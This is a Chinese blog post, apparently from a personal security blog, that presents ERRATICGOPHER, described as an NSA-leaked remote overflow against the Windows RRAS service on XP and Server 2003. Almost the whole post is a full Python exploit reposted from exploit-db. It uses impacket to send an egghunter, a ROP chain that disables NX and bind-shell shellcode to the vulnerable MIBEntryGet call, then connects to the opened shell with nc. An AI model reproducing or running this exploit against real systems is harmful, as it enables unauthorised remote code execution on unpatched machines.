{"title":"远程溢出之古怪地鼠ERRATICGOPHER","date":"2018-08-02T01:20:48.000Z","slug":"exploit-erraticgopher","tags":["EXPLOIT","SMB","远程溢出"],"updated":"2018-08-02T01:23:43.156Z","content":"<p>ERRATICGOPHER是NSA泄露的针对<code>RRAS（Routing and Remote Access Service）</code>服务的攻击程序，影响<code>Windows XP</code> <code>Windows 2003</code>，此漏洞在<code>Vista</code>发布之前已经被修复。</p>\n<p>附<code>EXPLOIT</code>，来自<a href=\"https://github.com/offensive-security/exploit-database/blob/d304cc3d3ef22bd6e5bccdeb6c13720345bbfc0c/exploits/windows/remote/41929.py\" target=\"_blank\" rel=\"noopener\">exploit-db</a></p>\n<blockquote>\n<p>需要安装<code>impacket</code>模块</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/usr/bin/env python</span><br><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">import struct</span><br><span class=\"line\">import sys</span><br><span class=\"line\">import time</span><br><span class=\"line\">import os</span><br><span class=\"line\"></span><br><span class=\"line\">from threading import Thread    </span><br><span class=\"line\">                                </span><br><span class=\"line\">from impacket import smb</span><br><span class=\"line\">from impacket import uuid</span><br><span class=\"line\">from impacket import dcerpc</span><br><span class=\"line\">from impacket.dcerpc.v5 import transport</span><br><span class=\"line\">                </span><br><span class=\"line\">target = sys.argv[1]</span><br><span class=\"line\"></span><br><span class=\"line\">print &apos;[-]Initiating connection&apos;</span><br><span class=\"line\">trans = transport.DCERPCTransportFactory(&apos;ncacn_np:%s[\\\\pipe\\\\browser]&apos; % target)</span><br><span class=\"line\">trans.connect()</span><br><span class=\"line\"></span><br><span class=\"line\">print &apos;[-]connected to ncacn_np:%s[\\\\pipe\\\\browser]&apos; % target</span><br><span class=\"line\">dce = trans.DCERPC_class(trans)</span><br><span class=\"line\">#RRAS DCE-RPC CALL</span><br><span class=\"line\">dce.bind(uuid.uuidtup_to_bin((&apos;8f09f000-b7ed-11ce-bbd2-00001a181cad&apos;, &apos;0.0&apos;)))</span><br><span class=\"line\"></span><br><span class=\"line\">egghunter = &quot;\\x66\\x81\\xca\\xff\\x0f\\x42\\x52\\x6a\\x02\\x58\\xcd\\x2e\\x3c\\x05\\x5a&quot;</span><br><span class=\"line\">egghunter += &quot;\\x74\\xef\\xb8\\x77\\x30\\x30\\x74\\x8b\\xfa\\xaf\\x75\\xea\\xaf\\x75\\xe7\\xff\\xe7&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#msfvenom -a x86 --platform windows -p windows/shell_bind_tcp lport=4444 -b &quot;\\x00&quot; -f python</span><br><span class=\"line\">buf =  &quot;&quot;</span><br><span class=\"line\">buf += &quot;\\xb8\\x3c\\xb1\\x1e\\x1d\\xd9\\xc8\\xd9\\x74\\x24\\xf4\\x5a\\x33&quot;</span><br><span class=\"line\">buf += &quot;\\xc9\\xb1\\x53\\x83\\xc2\\x04\\x31\\x42\\x0e\\x03\\x7e\\xbf\\xfc&quot;</span><br><span class=\"line\">buf += &quot;\\xe8\\x82\\x57\\x82\\x13\\x7a\\xa8\\xe3\\x9a\\x9f\\x99\\x23\\xf8&quot;</span><br><span class=\"line\">buf += &quot;\\xd4\\x8a\\x93\\x8a\\xb8\\x26\\x5f\\xde\\x28\\xbc\\x2d\\xf7\\x5f&quot;</span><br><span class=\"line\">buf += &quot;\\x75\\x9b\\x21\\x6e\\x86\\xb0\\x12\\xf1\\x04\\xcb\\x46\\xd1\\x35&quot;</span><br><span class=\"line\">buf += &quot;\\x04\\x9b\\x10\\x71\\x79\\x56\\x40\\x2a\\xf5\\xc5\\x74\\x5f\\x43&quot;</span><br><span class=\"line\">buf += &quot;\\xd6\\xff\\x13\\x45\\x5e\\x1c\\xe3\\x64\\x4f\\xb3\\x7f\\x3f\\x4f&quot;</span><br><span class=\"line\">buf += &quot;\\x32\\x53\\x4b\\xc6\\x2c\\xb0\\x76\\x90\\xc7\\x02\\x0c\\x23\\x01&quot;</span><br><span class=\"line\">buf += &quot;\\x5b\\xed\\x88\\x6c\\x53\\x1c\\xd0\\xa9\\x54\\xff\\xa7\\xc3\\xa6&quot;</span><br><span class=\"line\">buf += &quot;\\x82\\xbf\\x10\\xd4\\x58\\x35\\x82\\x7e\\x2a\\xed\\x6e\\x7e\\xff&quot;</span><br><span class=\"line\">buf += &quot;\\x68\\xe5\\x8c\\xb4\\xff\\xa1\\x90\\x4b\\xd3\\xda\\xad\\xc0\\xd2&quot;</span><br><span class=\"line\">buf += &quot;\\x0c\\x24\\x92\\xf0\\x88\\x6c\\x40\\x98\\x89\\xc8\\x27\\xa5\\xc9&quot;</span><br><span class=\"line\">buf += &quot;\\xb2\\x98\\x03\\x82\\x5f\\xcc\\x39\\xc9\\x37\\x21\\x70\\xf1\\xc7&quot;</span><br><span class=\"line\">buf += &quot;\\x2d\\x03\\x82\\xf5\\xf2\\xbf\\x0c\\xb6\\x7b\\x66\\xcb\\xb9\\x51&quot;</span><br><span class=\"line\">buf += &quot;\\xde\\x43\\x44\\x5a\\x1f\\x4a\\x83\\x0e\\x4f\\xe4\\x22\\x2f\\x04&quot;</span><br><span class=\"line\">buf += &quot;\\xf4\\xcb\\xfa\\xb1\\xfc\\x6a\\x55\\xa4\\x01\\xcc\\x05\\x68\\xa9&quot;</span><br><span class=\"line\">buf += &quot;\\xa5\\x4f\\x67\\x96\\xd6\\x6f\\xad\\xbf\\x7f\\x92\\x4e\\xae\\x23&quot;</span><br><span class=\"line\">buf += &quot;\\x1b\\xa8\\xba\\xcb\\x4d\\x62\\x52\\x2e\\xaa\\xbb\\xc5\\x51\\x98&quot;</span><br><span class=\"line\">buf += &quot;\\x93\\x61\\x19\\xca\\x24\\x8e\\x9a\\xd8\\x02\\x18\\x11\\x0f\\x97&quot;</span><br><span class=\"line\">buf += &quot;\\x39\\x26\\x1a\\xbf\\x2e\\xb1\\xd0\\x2e\\x1d\\x23\\xe4\\x7a\\xf5&quot;</span><br><span class=\"line\">buf += &quot;\\xc0\\x77\\xe1\\x05\\x8e\\x6b\\xbe\\x52\\xc7\\x5a\\xb7\\x36\\xf5&quot;</span><br><span class=\"line\">buf += &quot;\\xc5\\x61\\x24\\x04\\x93\\x4a\\xec\\xd3\\x60\\x54\\xed\\x96\\xdd&quot;</span><br><span class=\"line\">buf += &quot;\\x72\\xfd\\x6e\\xdd\\x3e\\xa9\\x3e\\x88\\xe8\\x07\\xf9\\x62\\x5b&quot;</span><br><span class=\"line\">buf += &quot;\\xf1\\x53\\xd8\\x35\\x95\\x22\\x12\\x86\\xe3\\x2a\\x7f\\x70\\x0b&quot;</span><br><span class=\"line\">buf += &quot;\\x9a\\xd6\\xc5\\x34\\x13\\xbf\\xc1\\x4d\\x49\\x5f\\x2d\\x84\\xc9&quot;</span><br><span class=\"line\">buf += &quot;\\x6f\\x64\\x84\\x78\\xf8\\x21\\x5d\\x39\\x65\\xd2\\x88\\x7e\\x90&quot;</span><br><span class=\"line\">buf += &quot;\\x51\\x38\\xff\\x67\\x49\\x49\\xfa\\x2c\\xcd\\xa2\\x76\\x3c\\xb8&quot;</span><br><span class=\"line\">buf += &quot;\\xc4\\x25\\x3d\\xe9&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#NX disable routine for Windows Server 2003 SP2</span><br><span class=\"line\">rop = &quot;\\x30\\xdb\\xc0\\x71&quot; #push esp, pop ebp, retn ws_32.dll</span><br><span class=\"line\">rop += &quot;\\x45&quot;*16</span><br><span class=\"line\">rop += &quot;\\xe9\\x77\\xc1\\x77&quot; #push esp, pop ebp, retn 4 gdi32.dll</span><br><span class=\"line\">rop += &quot;\\x5d\\x7a\\x81\\x7c&quot; #ret 20</span><br><span class=\"line\">rop += &quot;\\x71\\x42\\x38\\x77&quot; #jmp esp</span><br><span class=\"line\">rop += &quot;\\xf6\\xe7\\xbd\\x77&quot; #add esp,2c ; retn msvcrt.dll</span><br><span class=\"line\">rop += &quot;\\x90&quot;*2 + egghunter + &quot;\\x90&quot;*42</span><br><span class=\"line\">rop += &quot;\\x17\\xf5\\x83\\x7c&quot; #Disable NX routine</span><br><span class=\"line\">rop += &quot;\\x90&quot;*4</span><br><span class=\"line\"></span><br><span class=\"line\">stub = &quot;\\x21\\x00\\x00\\x00\\x10\\x27\\x00\\x00\\x30\\x07\\x00\\x00\\x00\\x40\\x51\\x06\\x04\\x00\\x00\\x00\\x00\\x85\\x57\\x01\\x30\\x07\\x00\\x00\\x08\\x00\\x00\\x00&quot; #Magic bytes</span><br><span class=\"line\">stub += &quot;\\x41&quot;*20 + rop + &quot;\\xCC&quot;*100 + &quot;w00tw00t&quot; + buf + &quot;\\x42&quot;*(1313-20-len(rop)-100-8-len(buf))</span><br><span class=\"line\">stub += &quot;\\x12&quot; #Magic byte</span><br><span class=\"line\">stub += &quot;\\x46&quot;*522</span><br><span class=\"line\">stub += &quot;\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00&quot; #Magic bytes</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">dce.call(0x1d, stub)   #0x1d MIBEntryGet (vulnerable function)</span><br><span class=\"line\">print &quot;[-]Exploit sent to target successfully...&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">print &quot;Waiting for shell...&quot;</span><br><span class=\"line\">time.sleep(5)</span><br><span class=\"line\">os.system(&quot;nc &quot; + target + &quot; 4444&quot;)</span><br></pre></td></tr></table></figure>","prev":{"title":"SQL注入备忘录","slug":"sql-injection-cheat-sheet"},"next":{"title":"爬虫之批量下载Admin5源码","slug":"crawl-admin5"},"link":"http://Jayl1n.github.io/post/exploit-erraticgopher/"}